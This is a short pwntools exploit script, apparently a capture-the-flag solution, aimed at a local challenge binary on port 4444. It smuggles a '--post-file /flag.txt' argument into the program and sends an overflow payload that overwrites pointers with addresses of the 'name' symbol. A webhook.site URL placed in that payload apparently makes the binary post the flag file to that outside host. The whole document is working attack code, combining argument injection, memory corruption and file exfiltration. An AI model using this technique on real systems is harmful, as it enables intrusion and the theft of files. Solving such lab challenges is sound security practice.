from pwn import *

conn=remote("localhost", 4444)
elf=ELF("../src/chall")

conn.recvuntil(b"book: ")

conn.sendline(b"--post-file\x00/flag.txt\x00");


payload=b"https://webhook.site/ca2c4a10-2803-4383-8659-204728de5a36\x00"
payload=payload+b"\x00"*(162-len(payload))

payload+=p64(elf.symbols["name"])
payload+=p64(elf.symbols["name"]+12)
payload+=p64(0x0)

#gdb.attach(conn)

conn.sendline(payload)

conn.interactive()
